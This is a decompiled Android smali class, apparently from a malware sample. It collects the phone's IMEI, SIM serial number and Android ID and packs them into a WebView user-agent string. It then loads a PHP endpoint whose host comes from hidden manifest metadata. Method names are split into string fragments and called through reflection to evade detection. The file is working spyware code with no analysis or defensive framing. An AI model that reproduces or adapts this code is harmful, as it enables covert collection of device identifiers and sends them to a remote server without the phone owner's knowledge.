.class public Lazz/oof/aucvvgjsxswe/TwisterNet;
.super Ljava/lang/Object;
.source "TwisterNet.java"


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# instance fields
.field private kostyak:Landroid/content/Context;

.field private osnova:Landroid/webkit/WebView;

.field private saitik:Ljava/lang/String;

.field private subich:Ljava/lang/String;


# direct methods
.method constructor <init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 34
    .param p1, "inkostyak"    # Landroid/content/Context;
    .param p2, "vidok"    # Ljava/lang/String;
    .param p3, "alldannie"    # Ljava/lang/String;

    .prologue
    .line 22
    invoke-direct/range {p0 .. p0}, Ljava/lang/Object;-><init>()V

    .line 20
    const-string v28, ""

    move-object/from16 v0, v28

    move-object/from16 v1, p0

    iput-object v0, v1, Lazz/oof/aucvvgjsxswe/TwisterNet;->saitik:Ljava/lang/String;

    .line 21
    const-string v28, "s0"

    move-object/from16 v0, v28

    move-object/from16 v1, p0

    iput-object v0, v1, Lazz/oof/aucvvgjsxswe/TwisterNet;->subich:Ljava/lang/String;

    .line 24
    const-string v28, "phone"

    move-object/from16 v0, p1

    move-object/from16 v1, v28

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v27

    check-cast v27, Landroid/telephony/TelephonyManager;

    .line 26
    .local v27, "verynicedannie":Landroid/telephony/TelephonyManager;
    new-instance v28, Ljava/lang/StringBuilder;

    invoke-direct/range {v28 .. v28}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual/range {v27 .. v27}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v29

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    invoke-virtual/range {v28 .. v28}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 27
    .local v9, "Ustroystvo":Ljava/lang/String;
    new-instance v28, Ljava/lang/StringBuilder;

    invoke-direct/range {v28 .. v28}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual/range {v27 .. v27}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v29

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    invoke-virtual/range {v28 .. v28}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 28
    .local v6, "Ceriyka":Ljava/lang/String;
    const-string v7, ""

    .line 29
    .local v7, "OsIdentificator":Ljava/lang/String;
    new-instance v28, Ljava/lang/StringBuilder;

    invoke-direct/range {v28 .. v28}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v29

    const-string v30, "android_id"

    invoke-static/range {v29 .. v30}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v29

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    invoke-virtual/range {v28 .. v28}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 30
    new-instance v8, Ljava/util/UUID;

    invoke-virtual {v7}, Ljava/lang/String;->hashCode()I

    move-result v28

    move/from16 v0, v28

    int-to-long v0, v0

    move-wide/from16 v28, v0

    invoke-virtual {v9}, Ljava/lang/String;->hashCode()I

    move-result v30

    move/from16 v0, v30

    int-to-long v0, v0

    move-wide/from16 v30, v0

    const/16 v32, 0x20

    shl-long v30, v30, v32

    invoke-virtual {v6}, Ljava/lang/String;->hashCode()I

    move-result v32

    move/from16 v0, v32

    int-to-long v0, v0

    move-wide/from16 v32, v0

    or-long v30, v30, v32

    move-wide/from16 v0, v28

    move-wide/from16 v2, v30

    invoke-direct {v8, v0, v1, v2, v3}, Ljava/util/UUID;-><init>(JJ)V

    .line 31
    .local v8, "Ustroistdoid":Ljava/util/UUID;
    invoke-virtual {v8}, Ljava/util/UUID;->toString()Ljava/lang/String;

    move-result-object v19

    .line 33
    .local v19, "hash":Ljava/lang/String;
    const-string v12, "ste"

    .line 34
    .local v12, "dfd":Ljava/lang/String;
    new-instance v28, Ljava/lang/StringBuilder;

    const-string v29, "sy"

    invoke-direct/range {v28 .. v29}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v28

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    const-string v29, "ma"

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    invoke-virtual/range {v28 .. v28}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v28

    const/16 v29, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v28

    move/from16 v2, v29

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v21

    .line 36
    .local v21, "polzovatelDannie":Landroid/content/SharedPreferences;
    new-instance v22, Lazz/oof/aucvvgjsxswe/PiratusKin;

    invoke-direct/range {v22 .. v22}, Lazz/oof/aucvvgjsxswe/PiratusKin;-><init>()V

    .line 37
    .local v22, "putt2":Lazz/oof/aucvvgjsxswe/PiratusKin;
    const-string v28, "getString"

    const-string v29, "status"

    const-string v30, "s0"

    move-object/from16 v0, v22

    move-object/from16 v1, v21

    move-object/from16 v2, v28

    move-object/from16 v3, v29

    move-object/from16 v4, v30

    invoke-virtual {v0, v1, v2, v3, v4}, Lazz/oof/aucvvgjsxswe/PiratusKin;->runus(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v25

    .line 38
    .local v25, "status":Ljava/lang/String;
    const-string v28, "getString"

    const-string v29, "rezultstroka"

    const-string v30, "null"

    move-object/from16 v0, v22

    move-object/from16 v1, v21

    move-object/from16 v2, v28

    move-object/from16 v3, v29

    move-object/from16 v4, v30

    invoke-virtual {v0, v1, v2, v3, v4}, Lazz/oof/aucvvgjsxswe/PiratusKin;->runus(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 40
    .local v11, "code":Ljava/lang/String;
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v24

    .line 42
    .local v24, "retrogradniy":Landroid/content/pm/PackageManager;
    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v28

    const/16 v29, 0x80

    move-object/from16 v0, v24

    move-object/from16 v1, v28

    move/from16 v2, v29

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v10

    .line 43
    .local v10, "beekatura":Landroid/content/pm/ApplicationInfo;
    iget-object v0, v10, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    move-object/from16 v28, v0

    const-string v29, "lndp"

    invoke-virtual/range {v28 .. v29}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v28

    move-object/from16 v0, v28

    move-object/from16 v1, p0

    iput-object v0, v1, Lazz/oof/aucvvgjsxswe/TwisterNet;->saitik:Ljava/lang/String;

    .line 44
    const-string v20, "to"

    .line 45
    .local v20, "hghgh":Ljava/lang/String;
    iget-object v0, v10, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    move-object/from16 v28, v0

    new-instance v29, Ljava/lang/StringBuilder;

    const-string v30, "po"

    invoke-direct/range {v29 .. v30}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v29

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    const-string v30, "k"

    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    invoke-virtual/range {v29 .. v29}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v29

    invoke-virtual/range {v28 .. v29}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v28

    move-object/from16 v0, v28

    move-object/from16 v1, p0

    iput-object v0, v1, Lazz/oof/aucvvgjsxswe/TwisterNet;->subich:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    .line 49
    .end local v10    # "beekatura":Landroid/content/pm/ApplicationInfo;
    .end local v20    # "hghgh":Ljava/lang/String;
    :goto_0
    new-instance v28, Landroid/webkit/WebView;

    move-object/from16 v0, v28

    move-object/from16 v1, p1

    invoke-direct {v0, v1}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    move-object/from16 v0, v28

    move-object/from16 v1, p0

    iput-object v0, v1, Lazz/oof/aucvvgjsxswe/TwisterNet;->osnova:Landroid/webkit/WebView;

    .line 50
    move-object/from16 v0, p0

    iget-object v0, v0, Lazz/oof/aucvvgjsxswe/TwisterNet;->osnova:Landroid/webkit/WebView;

    move-object/from16 v28, v0

    invoke-virtual/range {v28 .. v28}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v18

    .line 52
    .local v18, "gfytgy":Landroid/webkit/WebSettings;
    :try_start_1
    const-string v28, "android.webkit.WebSettings"

    invoke-static/range {v28 .. v28}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v28

    const-string v29, "setJavaScriptEnabled"

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    sget-object v32, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v32, v30, v31

    invoke-virtual/range {v28 .. v30}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v28

    const/16 v29, 0x1

    move/from16 v0, v29

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v29, v0

    const/16 v30, 0x0

    const/16 v31, 0x1

    invoke-static/range {v31 .. v31}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v31

    aput-object v31, v29, v30

    move-object/from16 v0, v28

    move-object/from16 v1, v18

    move-object/from16 v2, v29

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_2

    .line 59
    :goto_1
    move-object/from16 v0, p0

    iget-object v0, v0, Lazz/oof/aucvvgjsxswe/TwisterNet;->osnova:Landroid/webkit/WebView;

    move-object/from16 v28, v0

    invoke-virtual/range {v28 .. v28}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v28

    new-instance v29, Ljava/lang/StringBuilder;

    invoke-static/range {v19 .. v19}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v30, "="

    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    move-object/from16 v0, p0

    iget-object v0, v0, Lazz/oof/aucvvgjsxswe/TwisterNet;->subich:Ljava/lang/String;

    move-object/from16 v30, v0

    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    const-string v30, "="

    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    move-object/from16 v0, v29

    move-object/from16 v1, v25

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    const-string v30, "="

    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    move-object/from16 v0, v29

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    invoke-virtual/range {v29 .. v29}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v29

    invoke-virtual/range {v28 .. v29}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    .line 60
    new-instance v26, Lazz/oof/aucvvgjsxswe/MyJavaScriptChromeClientTime;

    move-object/from16 v0, v26

    move-object/from16 v1, p1

    invoke-direct {v0, v1}, Lazz/oof/aucvvgjsxswe/MyJavaScriptChromeClientTime;-><init>(Landroid/content/Context;)V

    .line 61
    .local v26, "vcvcvcvvcv":Lazz/oof/aucvvgjsxswe/MyJavaScriptChromeClientTime;
    const-string v15, "bChromeC"

    .line 63
    .local v15, "fdgfdgdjkjjhk":Ljava/lang/String;
    :try_start_2
    const-string v28, "android.webkit.WebView"

    invoke-static/range {v28 .. v28}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v28

    new-instance v29, Ljava/lang/StringBuilder;

    const-string v30, "setWe"

    invoke-direct/range {v29 .. v30}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v29

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    const-string v30, "lient"

    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    invoke-virtual/range {v29 .. v29}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v29

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    const-class v32, Landroid/webkit/WebChromeClient;

    aput-object v32, v30, v31

    invoke-virtual/range {v28 .. v30}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v28

    move-object/from16 v0, p0

    iget-object v0, v0, Lazz/oof/aucvvgjsxswe/TwisterNet;->osnova:Landroid/webkit/WebView;

    move-object/from16 v29, v0

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    aput-object v26, v30, v31

    invoke-virtual/range {v28 .. v30}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    .line 69
    :goto_2
    new-instance v23, Ljava/util/Random;

    invoke-direct/range {v23 .. v23}, Ljava/util/Random;-><init>()V

    .line 70
    .local v23, "random":Ljava/util/Random;
    const-string v14, "tp"

    .line 71
    .local v14, "dfsdfsd":Ljava/lang/String;
    const-string v17, "rn"

    .line 73
    .local v17, "fsdf":Ljava/lang/String;
    :try_start_3
    const-string v16, "adU"

    .line 74
    .local v16, "fgffdfd":Ljava/lang/String;
    new-instance v28, Ljava/lang/StringBuilder;

    const-string v29, "ht"

    invoke-direct/range {v28 .. v29}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v28

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    const-string v29, "://"

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    move-object/from16 v0, p0

    iget-object v0, v0, Lazz/oof/aucvvgjsxswe/TwisterNet;->saitik:Ljava/lang/String;

    move-object/from16 v29, v0

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    const-string v29, "/"

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    move-object/from16 v0, v28

    move-object/from16 v1, p2

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    const-string v29, ".php?data="

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    move-object/from16 v0, v28

    move-object/from16 v1, p3

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    const-string v29, "&"

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    move-object/from16 v0, v28

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    const-string v29, "d="

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    const v29, 0x3b9ac9ff

    move-object/from16 v0, v23

    move/from16 v1, v29

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v29

    invoke-static/range {v29 .. v29}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v29

    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v28

    invoke-virtual/range {v28 .. v28}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 75
    .local v13, "dfdfdfddd":Ljava/lang/String;
    const-string v28, "android.webkit.WebView"

    invoke-static/range {v28 .. v28}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v28

    new-instance v29, Ljava/lang/StringBuilder;

    const-string v30, "lo"

    invoke-direct/range {v29 .. v30}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v29

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    const-string v30, "rl"

    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v29

    invoke-virtual/range {v29 .. v29}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v29

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    const-class v32, Ljava/lang/String;

    aput-object v32, v30, v31

    invoke-virtual/range {v28 .. v30}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v28

    move-object/from16 v0, p0

    iget-object v0, v0, Lazz/oof/aucvvgjsxswe/TwisterNet;->osnova:Landroid/webkit/WebView;

    move-object/from16 v29, v0

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    aput-object v13, v30, v31

    invoke-virtual/range {v28 .. v30}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_0

    .line 80
    .end local v13    # "dfdfdfddd":Ljava/lang/String;
    .end local v16    # "fgffdfd":Ljava/lang/String;
    :goto_3
    return-void

    .line 77
    :catch_0
    move-exception v28

    goto :goto_3

    .line 65
    .end local v14    # "dfsdfsd":Ljava/lang/String;
    .end local v17    # "fsdf":Ljava/lang/String;
    .end local v23    # "random":Ljava/util/Random;
    :catch_1
    move-exception v28

    goto/16 :goto_2

    .line 54
    .end local v15    # "fdgfdgdjkjjhk":Ljava/lang/String;
    .end local v26    # "vcvcvcvvcv":Lazz/oof/aucvvgjsxswe/MyJavaScriptChromeClientTime;
    :catch_2
    move-exception v28

    goto/16 :goto_1

    .line 46
    .end local v18    # "gfytgy":Landroid/webkit/WebSettings;
    :catch_3
    move-exception v28

    goto/16 :goto_0
.end method
